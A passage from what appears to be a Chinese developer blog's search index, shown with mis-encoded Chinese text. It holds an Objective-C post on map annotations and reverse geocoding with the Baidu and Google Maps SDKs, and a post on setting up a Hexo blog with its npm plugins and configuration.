YES; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; [annotationView setSelected:YES animated:NO]; // é€‰ä¸­å½“å‰çš„ &#125; return annotationView;&#125; æŽ‰å‘é‡Œäº† å¦‚æžœæ‰€æœ‰çš„å¤§å¤´é’ˆéƒ½å…±ç”¨ä¸€ä¸ªè‡ªå®šä¹‰çš„paopaoViewï¼ˆpetAnnotationViewï¼‰çš„è¯ï¼Œå°±ä¼šå¯¼è‡´selectAnnotation:animated:æ–¹æ³•æ²¡æœ‰æ•ˆæžœ å¹¶ä¸”åªæœ‰æœ€åŽæ·»åŠ çš„é‚£ä¸€ä¸ªè½¨è¿¹å¸¦ä½ ç‚¹å‡»æ‰ä¼šè°ƒç”¨selectAnnotation:animated: å…¶ä»–å¤§å¤´é’ˆç‚¹å‡»éƒ½ä¼šå¤±æ•ˆ å¦‚æžœè¦æŽ§åˆ¶åˆ‡æ¢è½¨è¿¹ç‚¹åˆ·æ–°æ˜¾ç¤ºå¼¹æ¡†ä¿¡æ¯ï¼Œé‚£å°±éœ€è¦æ ¹æ®ç´¢å¼•å…ˆç§»é™¤å½“å‰ç‚¹ï¼Œå†é‡æ–°æ·»åŠ é‡æ–°æ¸²æŸ“ï¼Œè€Œä¸”åˆ‡æ¢ä¸æµç•…ï¼Œä¼šå‡ºçŽ°èŽ«åçš„é—®é¢˜ æ€Žä¹ˆä»Žå‘é‡Œè·³å‡ºæ¥ï¼Ÿ 1ã€æ‰¾å¤§ç‰› 2ã€æŸ¥èµ„æ–™ 3ã€ä¹ æƒ¯æœ‰å‘ï¼Œé¡ºå…¶è‡ªç„¶ ä½†æ˜¯ ä½œä¸ºä¸€ä¸ªè§†è¿™ä¸–ç•Œä¸Šåªæœ‰ä¸¤ä»¶äº‹æ˜¯çœŸç†ï¼šäººéƒ½ä¼šæ­»ï¼›ç¨‹åºæ°¸è¿œæœ‰bugä¸ºåº§å³é“­çš„ç¨‹åºçŒ¿ï¼Œå½“ç„¶æ˜¯é€‰æ‹©3å•Šï¼Œä½†æ˜¯è€ƒè™‘åˆ°è¿™æ ·æœ‰å¯èƒ½ä¼šè¢«æ‰“æ­»ï¼Œè€Œæ±‚äººåˆä¸å¦‚æ±‚å·±çš„ç†å¿µï¼Œæˆ‘å°±å¼€å§‹è‹¦é€¼çš„æŸ¥èµ„æ–™ï¼Œçœ‹å®˜æ–¹demoå’Œå®˜æ–¹è®ºå›ï¼ˆå±Žä¸€æ ·çš„è®ºå›ï¼Œæ°¸è¿œå›žå¤ï¼šåœ¨å¤„ç†ä¸­ã€æ„Ÿè°¢ä½ çš„åé¦ˆï¼‰ ç»è¿‡æˆ‘çš„åå¤æŸ¥è¯¢èµ„æ–™ï¼Œä¸æ–­å°è¯•ï¼Œæœ€åŽç»ˆäºŽåœ¨æˆ‘çš„çµæœºä¸€åŠ¨ä¸‹è§£å†³äº†ï¼Œå†æ¬¡å°è¯äº†çˆ±è¿ªç”Ÿçš„è¯ä½†é‚£1ï¼…çš„çµæ„Ÿæ˜¯æœ€é‡è¦çš„ï¼Œç”šè‡³æ¯”é‚£99ï¼…çš„æ±—æ°´éƒ½è¦é‡è¦ã€‚ðŸ˜‚ æ—¢ç„¶ä¸€ä¸ªè½¨è¿¹ç‚¹å¯ä»¥æ­£å¸¸çš„ç‚¹å‡»æ˜¾ç¤ºå’Œéšè—ï¼Œæ˜¯ä¸æ˜¯éœ€è¦æ¯ä¸€ä¸ªè½¨è¿¹ç‚¹å¤§å¤´é’ˆéƒ½éœ€è¦ç»‘å®šä¸€ä¸ªpaopaoViewå‘¢ æœ¬ç€å®žè·µæ˜¯æ£€éªŒçœŸç†çš„å”¯ä¸€æ ‡å‡†ï¼ŒäºŽæ˜¯æœ‰äº†ä»¥ä¸‹ä»£ç  12345678910111213141516171819202122232425- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // ä¸æ˜¯è‡ªå®šä¹‰å¤§å¤´é’ˆæ¨¡åž‹ return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // å½“å‰ä½ç½®ç‚¹ç±»åž‹ annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; &#125; XSLocationDetails *locationDetails = customAnnotation.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@&quot;_small&quot;]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; petAnnotationView.isHiddenNoNeeds = YES; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationDetails; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:petAnnotationView]; self.petAnnotationView = petAnnotationView; &#125; return annotationView;&#125; æ˜¯éª¡å­æ˜¯é©¬æ‹‰å‡ºæ¥æºœæºœï¼Œç¼–è¯‘è¿è¡Œï¼Œè½¨è¿¹ç‚¹éƒ½å¯ä»¥ç‚¹å‡»äº†ï¼Œå“‡ï¼Œå¼€å¿ƒçš„å°±åƒä¸€ä¸ªå‡ åå²çš„å­©å­æ‹äº†æ‹è‚šçš®ï¼Œæ­£å‡†å¤‡åŽ»å–æ¯Coffeeèˆ’çˆ½ä¸€ä¸‹å‘¢ï¼Œå‘çŽ°åœ°å€ä¿¡æ¯æ²¡æœ‰ äºŽæ˜¯å¼€å§‹è€ƒè™‘çŽ°åœ¨æ˜¯ä¸€ä¸ªè½¨è¿¹ç‚¹å¯¹åº”ä¸€ä¸ªè‡ªå®šä¹‰çš„paopaoViewï¼Œé‚£ä¹ˆåœ¨ååœ°ç†ç¼–ç çš„ä»£ç†å›žè°ƒé‡Œé¢æ€Žä¹ˆæŠŠåœ°å€ä¿¡æ¯å¯¹åº”çš„è½¨è¿¹ç‚¹æ¨¡åž‹æ›´æ–°å‘¢ æ ¹æ®ä»£ç†å›žè°ƒé‡Œé¢locationåæ ‡å’Œå½“å‰çš„æ‰€æœ‰åŽ†å²è½¨è¿¹æ•°æ®åæ ‡å¯¹æ¯”, å¼€å¿ƒçš„æ‰“å°ä¸€ä¸‹ï¼Œç«Ÿç„¶å’Œä¼ é€’çš„è½¬æ¢å‰çš„åæ ‡æœ‰è¯¯å·®ï¼› ä»¿è°·æ­Œåœ°å›¾ååœ°ç†ç¼–ç ï¼Œæ”¹ä»£ç†å›žè°ƒä¸ºblockå›žè°ƒï¼Ÿç›´æŽ¥åŠ¨æ‰‹ 123456789// XSBaiduGeocoder.htypedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc self.reverseGeocodeHandler = handler; // è§£æžåœ°å€ BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; BMKGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"ç™¾åº¦ååœ°ç†ç¼–ç èŽ·å–åœ°å€å¤±è´¥"); &#125; else &#123; XSLog(@"ç™¾åº¦ååœ°ç†ç¼–ç èŽ·å–åœ°å€æˆåŠŸ"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc if (self.reverseGeocodeHandler) &#123; self.reverseGeocodeHandler(result); &#125;&#125;@end BMKGeoCodeSearchè¿™ä¸ªä¸€å®šè¦è°ƒç”¨ä¸€æ¬¡åˆ›å»ºä¸€æ¬¡ï¼Œå¦åˆ™åªä¼šè½¬æ¢ä¸€æ¬¡åœ°å€ä¿¡æ¯ ä½†æ˜¯æ­¤æ—¶è™½ç„¶è½¨è¿¹ç‚¹åœ°å€ä¿¡æ¯éƒ½è½¬æ¢äº†ï¼Œä½†æ˜¯åªæœ‰ç‚¹å‡»æœ€åŽä¸€ä¸ªè½¨è¿¹ç‚¹æœ‰åœ°å€ä¿¡æ¯ï¼Œå…¶ä»–éƒ½æ˜¯ç©ºçš„ï¼Œè¿™ä¸ªé—®é¢˜å¡äº†å¥½ä¹…è„‘å­æ²¡è½¬è¿‡æ¥ï¼Œä¸€ç›´åœ¨blockæ•èŽ·æ–¹å‘è€ƒè™‘ï¼ŒåŽæ¥çªç„¶é†’æ‚Ÿ self.reverseGeocodeHandler = handlerblockæ˜¯æ¯æ¬¡éƒ½è¿›æ¥èµ‹å€¼ï¼Œè€Œåœ°å€è½¬æ¢å®Œæˆçš„ä»£ç†å›žè°ƒæ–¹æ³•åˆè°ƒç”¨å»¶è¿Ÿï¼Œé‚£åœ¨ä»£ç†å›žè°ƒæ–¹æ³•é‡Œé¢å›žè°ƒä¸´æ—¶ä¿å­˜çš„self.reverseGeocodeHandlerè‚¯å®šæ˜¯æœ€åŽä¸€ä¸ªï¼Œæ‰€ä»¥å°±åªä¼šæ›´æ–°æœ€åŽä¸€ä¸ªè½¨è¿¹åæ ‡çš„æ¨¡åž‹åœ°å€æ•°æ® æ—¢ç„¶BMKGeoCodeSearchæ˜¯æ¯ä¸€ä¸ªåæ ‡å¯¹åº”ä¸€ä¸ªï¼Œé‚£ä¸ªå®Œå…¨å¯ä»¥è‡ªå®šä¹‰XSGeoCodeSearchç»§æ‰¿BMKGeoCodeSearchæ·»åŠ å¯¹åº”çš„å›žè°ƒhandlerï¼Œç­‰åœ°å€è½¬æ¢å®Œæˆçš„ä»£ç†å›žè°ƒæ—¶å€™ï¼Œæ ¹æ®XSGeoCodeSearchä¿å­˜çš„handlerå›žè°ƒå›žåŽ»ï¼ŒäºŽæ˜¯ä»£ç ä¿®æ”¹å¦‚ä¸‹ 12345678910// XSGeoCodeSearch.h@class BMKReverseGeoCodeResult;typedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSGeoCodeSearch : BMKGeoCodeSearch@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end 1234567// XSBaiduGeocoder.h@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc // è§£æžåœ°å€ BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; XSGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.reverseGeocodeHandler = handler; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"ç™¾åº¦ååœ°ç†ç¼–ç èŽ·å–åœ°å€å¤±è´¥"); &#125; else &#123; XSLog(@"ç™¾åº¦ååœ°ç†ç¼–ç èŽ·å–åœ°å€æˆåŠŸ"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc // æŸ¥è¯¢searcher å¯¹åº”çš„block ç„¶åŽå›žè°ƒ XSGeoCodeSearch *codeSearcher = (XSGeoCodeSearch *)searcher; if (codeSearcher.reverseGeocodeHandler) &#123; codeSearcher.reverseGeocodeHandler(result); &#125;&#125;@end å†è¿è¡Œï¼Œç‚¹å‡»åˆ‡æ¢è½¨è¿¹ç‚¹ï¼Œä¸–ç•Œéƒ½ç¾Žå¥½äº†ï¼Œæ“ä½œè½¨è¿¹ç‚¹çš„åˆ‡æ¢ä¹Ÿå¯ä»¥ç›´æŽ¥ä½¿ç”¨selectAnnotation:animated:å¼¹å‡ºè¯¦æƒ…è‡ªå®šä¹‰å¼¹æ¡†äº† è½¨è¿¹ç‚¹åŒºåŸŸæŽ§åˆ¶ å¦‚æžœæƒ³æŽ§åˆ¶æ‰€æœ‰çš„ä¼°è®¡ç‚¹éƒ½åœ¨å±å¹•èŒƒå›´å†…æ˜¾ç¤ºï¼Œæœ€æ—©ä½¿ç”¨çš„ä¸Šä¸€ç¯‡é‡Œé¢çš„æ–¹æ³•ï¼ŒåŽæ¥æŸ¥èµ„æ–™çœ‹è¿™ä¸€ç§ä¹Ÿå¯ä»¥ 1234567891011121314151617181920212223- (void)baiduMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; //åˆ›å»ºä¸¤ä¸ªæ•°ç»„ï¼Œç”¨æ¥å­˜æ‰€æœ‰çš„ç»åº¦å’Œçº¬åº¦ if (count &lt; 2) return; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@"@max.floatValue"];//æœ€å¤§çº¬åº¦ NSNumber *latMin = [latArr valueForKeyPath:@"@min.floatValue"];//æœ€å°çº¬åº¦ NSNumber *lonMax = [lonArr valueForKeyPath:@"@max.floatValue"];//æœ€å¤§ç»åº¦ NSNumber *lonMin = [lonArr valueForKeyPath:@"@min.floatValue"];//æœ€å°ç»åº¦ BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // æ•°å­—è¶Šå° ç¼©æ”¾ç­‰çº§è¶Šå¤§ region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES];&#125; å½“ç„¶è¿˜æœ‰æ›´ç®€å•çš„æ–¹æ³•,æ‰€ä»¥ä¸€å®šè¦å¤šçœ‹å„ç§SDKçš„å¤´æ–‡ä»¶ï¼Œçœ‹éƒ½æœ‰å“ªäº›åŠŸèƒ½ 12345/** *è®¾ç½®åœ°å›¾ä½¿æ˜¾ç¤ºåŒºåŸŸæ˜¾ç¤ºæ‰€æœ‰annotations,å¦‚æžœæ•°ç»„ä¸­åªæœ‰ä¸€ä¸ªåˆ™ç›´æŽ¥è®¾ç½®åœ°å›¾ä¸­å¿ƒä¸ºannotationçš„ä½ç½® *@param annotations æŒ‡å®šçš„æ ‡æ³¨ *@param animated æ˜¯å¦å¯åŠ¨åŠ¨ç”» */- (void)showAnnotations:(NSArray *)annotations animated:(BOOL)animated; è°·æ­Œåœ°å›¾åŽ†å²è½¨è¿¹ å…³äºŽè°·æ­Œåœ°å›¾åŽ†å²è½¨è¿¹ï¼ŒåŸºæœ¬ä¸Šå°±æ²¡ä»€ä¹ˆè¯´çš„äº†ï¼ŒæŽ¥å£ç›¸æ¯”ç™¾åº¦æ›´è§„èŒƒå’Œæ¸…æ™° è°·æ­Œåœ°å›¾æ·»åŠ Marker(ç›¸å½“äºŽç™¾åº¦åœ°å›¾Annotation)ç›´æŽ¥é…ç½®å¤§å¤´é’ˆå„ç§å±žæ€§ç„¶åŽmarker.map = self.googleMapViewå°±ç­‰äºŽæ·»åŠ äº†ä¸€ä¸ªå¤§å¤´é’ˆï¼Œæ²¡æœ‰å›žè°ƒ è°·æ­Œåœ°å›¾è§¦å‘paopaoViewçš„æ—¶å€™ï¼Œè°ƒç”¨ 12345678910111213141516171819- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSMarker *myMarker = (XSMarker *)marker; XSLocationDetails *locationModel = myMarker.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; petAnnotationView.isHiddenNoNeeds = YES; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:locationModel.locationCoordinate2D completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; // èŽ·å–ç¬¬ä¸€ä¸ªä½ç½®ä¿¡æ¯ GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@"%@, %@", firstString, lastString]; locationModel.deviceAddress = address; petAnnotationView.locationDetails = locationModel; // åœ°å€è½¬æ¢å¤„ç†é‡æ–°åˆ·æ–°ç•Œé¢ &#125;]; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationModel; return petAnnotationView;&#125; è°·æ­Œåœ°å›¾è²Œä¼¼æ²¡æœ‰å¯ä»¥èŽ·å–åœ°å›¾ä¸Šæ‰€æœ‰Markerçš„æ–¹æ³•ï¼ˆå¯èƒ½æˆ‘æ²¡æ‰¾åˆ°ï¼‰ï¼Œéœ€è¦æ·»åŠ çš„æ—¶å€™è‡ªå·±ç»´æŠ¤ä¸€ä¸ªæ•°ç»„ è°·æ­Œåœ°å›¾çš„ååœ°ç†ç¼–ç æœ¬æ¥å°±æ˜¯blockå›žè°ƒ è°·æ­Œåœ°å›¾æŽ§åˆ¶æ‰€æœ‰è½¨è¿¹ç‚¹èŒƒå›´çš„å®žçŽ° 12345678- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; bounds = [bounds includingCoordinate:locationDetails.locationCoordinate2D]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125;]]></content>
      <categories>
        <category>iOS</category>
        <category>åœ°å›¾</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>åœ°å›¾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexoåšå®¢æ­å»º]]></title>
    <url>%2Farchives%2Fb8f4bd70.html</url>
    <content type="text"><![CDATA[ä¹‹å‰åœ¨å­¦ä¹ ç¼–ç¨‹å’Œå¼€å§‹å·¥ä½œçš„æ—¶å€™ï¼Œä¹Ÿéƒ½æœ‰æ•´ç†å’Œå†™ç¬”è®°çš„ä¹ æƒ¯ï¼Œç¬”è®°ä¸€ç›´æ˜¯ä½¿ç”¨Gitbookç¼–è¾‘æ•´ç†å’ŒåŒæ­¥çš„ï¼Œä¹Ÿæœ‰æƒ³æ­å»ºä¸€ä¸ªè‡ªå·±çš„åšå®¢ä½†æ˜¯åˆå› ä¸ºè‡ªå·±å¤ªæ‡’æ•£ï¼Œè€Œä¸”æ„Ÿè§‰æ­å»ºåšå®¢æ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥å°±ä¸€ç›´æ²¡æœ‰ä»˜è¯¸è¡ŒåŠ¨ï¼›ç›´åˆ°æœ€è¿‘å¶ç„¶çœ‹åˆ°ä»‹ç»ä½¿ç”¨Hexo + GitHubPagesæ­å»ºåšå®¢çš„æ–‡ç« ï¼Œå°±æŸ¥äº†ä¸‹ç›¸å…³çš„èµ„æ–™å’Œä»‹ç»ï¼Œæ­å»ºäº†ä¸€ä¸ªç®€å•çš„åšå®¢ï¼ˆGitHubPages + Hexo + Nextä¸»é¢˜ï¼‰ã€‚ å…³äºŽåšå®¢ å¸¸è§çš„åšå®¢æ­å»ºæ–¹æ³•ï¼ˆæŸ¥åˆ°èµ„æ–™çš„ï¼‰ WordPressï¼šä¸€èˆ¬éœ€è¦ç‹¬ç«‹åŸŸåï¼ˆæ”¶è´¹ï¼‰ï¼Œä¼ ç»Ÿçš„åšå®¢æ­å»ºæ–¹æ³•ï¼Œä½†æ˜¯å¯¹MarkDownæ”¯æŒä¸æ˜¯å¾ˆå¥½ GitHubPages + Jekellï¼šå…è´¹ï¼Œç¨å¾®æ¯”è¾ƒéº»çƒ¦ GitHubPages + Hexoï¼šå…è´¹ï¼Œä½¿ç”¨ç®€å•ï¼Œé€‚åˆæ–°æ‰‹å…¥é—¨ å…³äºŽHexo Hexo æ˜¯ä¸€ä¸ªåŸºäºŽ Nodejs çš„é™æ€åšå®¢ç½‘ç«™ç”Ÿæˆå™¨ï¼Œä½œè€…æ˜¯æ¥è‡ªä¸­å›½å°æ¹¾çš„Tommy Chenã€‚ ä½œè€…ç½‘ç«™ ç‰¹ç‚¹ éƒ¨ç½²æ–¹ä¾¿ä¸”é€Ÿåº¦å¿« æ”¯æŒMarkdownè¯­æ³• å·²ç§»æ¤ Octopress æ’ä»¶ é«˜æ‰©å±•æ€§ã€è‡ªè®¢æ€§ å…¼å®¹Windows, Mac &amp; Linux Hexoå®žçŽ°åŽŸç† 1ã€Hexoæ˜¯ä¸€ä¸ªé™æ€åšå®¢ç”Ÿæˆå™¨ï¼Œæ ¹æ®ç»™å®šçš„ä¸»é¢˜ï¼Œè´Ÿè´£æŠŠå†™å¥½çš„ Markdown æ–‡ç« è½¬æ¢æˆä¸€å † HTML + CSS + Javascript é¡µé¢ã€‚ 2ã€Hexoè¿˜æœ‰æŠŠç”Ÿæˆå¥½çš„ç«™ç‚¹ä¸Šä¼ åˆ° Github Pages çš„åŠŸèƒ½ã€‚ GitHubPages + Hexoæ­å»ºæ–¹æ³• å…³äºŽä½¿ç”¨å¯å‚è€ƒä¸‹é¢è¿™ä¸¤ç¯‡æ–‡ç« ï¼Œå†™çš„éžå¸¸è¯¦ç»†ï¼Œè€Œä¸”æ˜¯é’ˆå¯¹Windows/Macä¸¤ä¸ªå¹³å°æ–¹æ³•ï¼Œå°±ä¸åœ¨æµªè´¹æ—¶é—´ç å­—äº†ã€‚ Macæ­å»ºHexoåšå®¢åŠNexTä¸»é¢˜é…ç½®ä¼˜åŒ– åšå®¢æ­å»ºåŒ…å«windows å¸¸ç”¨çš„æŒ‡ä»¤ 12345hexo clean // æ¸…ç©ºæœ¬åœ°ç¼“å­˜ï¼Œè§£å†³ç”±äºŽæœ¬åœ°ç¼“å­˜å¯¼è‡´éƒ¨ç½²æ— æ•ˆhexo g // == hexo generate #ç”Ÿæˆé™æ€ç½‘é¡µgulp // åŽ‹ç¼©ç”Ÿæˆçš„é™æ€èµ„æ–™ï¼ˆå¦‚æžœå®‰è£…gulpæ’ä»¶ï¼Œå…·ä½“å®‰è£…æ–¹æ³•è§ä¸‹é¢ï¼‰hexo d // == hexo deploy #å¼€å§‹éƒ¨ç½²hexo s // == hexo server #å¯åŠ¨æœåŠ¡å™¨ æœ¬åœ°è°ƒè¯•ä½¿ç”¨ æ’ä»¶å®‰è£…RSSè®¢é˜…æ’ä»¶ æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ 1npm install hexo-generator-feed --save æ‰“å¼€ Hexo ç«™ç‚¹ä¸‹çš„ _config.yml ,æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š 12345678# feed# Dependencies: https://github.com/hexojs/hexo-generator-feedfeed:type: atompath: atom.xmllimit: 20hub:content: æœ¬åœ°æœç´¢æ’ä»¶ æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ 1npm install hexo-generator-searchdb --save æ‰“å¼€ Hexo ç«™ç‚¹çš„ _config.yml,æ·»åŠ é…ç½® 12345search:path: search.xmlfield: postformat: htmllimit: 10000 é™æ€èµ„æºåŽ‹ç¼©æ’ä»¶ å®‰è£…gulp 1npm install gulp -g // å¦‚æžœæŠ¥npm WARN deprecatedè­¦å‘Š å¯ä½¿ç”¨npm install -g npm å®‰è£…gulpæ’ä»¶ï¼š 12345npm install gulp-minify-css --save // å¦‚æžœæŠ¥npm WARN deprecatedè­¦å‘Šåˆ™ä½¿ç”¨sudo npm install gulp-clean-cssæ‰§è¡Œnpm install gulp-uglify --savenpm install gulp-htmlmin --savenpm install gulp-htmlclean --savenpm install gulp-imagemin --save ä¸»é¢˜é…ç½®è®¾ç½®ç½‘ç«™æ ‡ç­¾é¡µfaviconå›¾æ ‡ å›¾æ ‡æ ¼å¼ï¼š32 * 32 çš„icoæ ¼å¼å›¾æ ‡ï¼Œé‡å‘½åä¸ºfavicon.ico æŠŠè®¾è®¡å¥½çš„å›¾æ ‡æ”¾åœ¨/themes/next/source/imagesé‡Œ ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶medium 1234567favicon: small: /images/favicon-16x16-next.png medium: /images/favicon.ico apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml æ›´å¤šé…ç½®å¯å‚è€ƒHexo+Nextä¸ªäººåšå®¢ä¸»é¢˜ä¼˜åŒ– å…³äºŽå¤šç”µè„‘åŒæ­¥ ä½¿ç”¨ç”µè„‘æ­å»ºå¥½åšå®¢åŽå¯èƒ½é¢ä¸´å¦‚ä¸‹é—®é¢˜ 1ã€æ˜¯åœ¨å®¶é‡Œç§äººç”µè„‘ä¸Šæ­å»ºçš„ï¼Œæƒ³åœ¨å…¬å¸ä¹Ÿå¯ä»¥æ„‰å¿«çš„å†™æ–‡ç«  2ã€æ¢äº†ä¸€å°æ–°çš„ç”µè„‘ï¼ˆæŒ£é’±äº†è¦æ¢è£…å¤‡ðŸ˜‚ï¼‰ 3ã€ç”µè„‘ç³»ç»Ÿå´©äº†ðŸ˜­ å…³äºŽå¤šç”µè„‘åŒæ­¥è§£å†³æ–¹æ¡ˆ1 gitHubåˆ†æ”¯ç®¡ç†ï¼Œmasteråˆ†æ”¯å­˜åšå®¢é™æ€ç½‘é¡µèµ„æºï¼ŒHexoåˆ†æ”¯å­˜æ‰€æœ‰æºæ–‡ä»¶ï¼ˆè®¾ç½®ä¸ºé»˜è®¤åˆ†æ”¯ï¼‰ æ¯ä¸ªç”µè„‘æ¯æ¬¡æ›´æ–°æ–‡ç« å‰éœ€è¦æ­£å¸¸çš„gitåŒæ­¥æ“ä½œ æ¯ä¸ªç”µè„‘æ¯æ¬¡æ›´æ–°æ–‡ç« åŽéœ€è¦æ­£å¸¸çš„gitåŒæ­¥æ“ä½œ ä½†æ˜¯ä¸ªäººæ„Ÿè§‰ä¸å®‰å…¨ï¼Œåˆ«äººå¯èƒ½ç›´æŽ¥æŠŠä½ çš„Hexoåˆ†æ”¯æ‹‰å–ä¸‹æ¥å°±ç­‰äºŽèŽ·å–äº†ä½ çš„å…¨éƒ¨åšå®¢èµ„æºï¼ˆè™½ç„¶æˆ‘çš„åšå®¢æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä»·å€¼ðŸ˜‚ï¼‰ å…·ä½“åˆ†æ”¯å®žçŽ°å¯å‚è€ƒåˆ©ç”¨åˆ†æ”¯åŒæ­¥ å…³äºŽå¤šç”µè„‘åŒæ­¥è§£å†³æ–¹æ¡ˆ2 æ¯æ¬¡æ‰‹åŠ¨æ‹·è´æœ€æ–°çš„æ–‡ä»¶å¤¹æ›¿æ¢å¦ä¸€å°ç”µè„‘æ—§æ–‡ä»¶å¤¹ï¼ˆæƒ³æƒ³å°±éº»çƒ¦ï¼‰ é€šè¿‡äº‘ç›˜å¦‚Dropboxè‡ªåŠ¨åŒæ­¥æ•´ä¸ªæ–‡ä»¶å¤¹ï¼Œä½¿æ‰€æœ‰çš„ç”µè„‘éƒ½å¯ä»¥åŒæ­¥åˆ°æœ€æ–°çš„ ç›®æ ‡ç”µè„‘èŽ·å–åˆ°æœ€æ–°çš„åšå®¢æ–‡ä»¶åŽ å¦‚æžœæ˜¯æƒ…å½¢3å¯ä»¥è€ƒè™‘å…ˆæŠŠæ•´ä¸ªåšå®¢ç›®å½•æ‹·è´å‡ºæ¥åˆ°æ–°çš„ç³»ç»Ÿåšå®¢ç›®å½•ä¸‹ GitHubæ·»åŠ é…ç½®æ–°ç”µè„‘çš„SSH key å’Œæ­å»ºæ—¶ä¸€æ ·å‚è€ƒMacæ­å»ºHexoåšå®¢åŠNexTä¸»é¢˜é…ç½®ä¼˜åŒ– 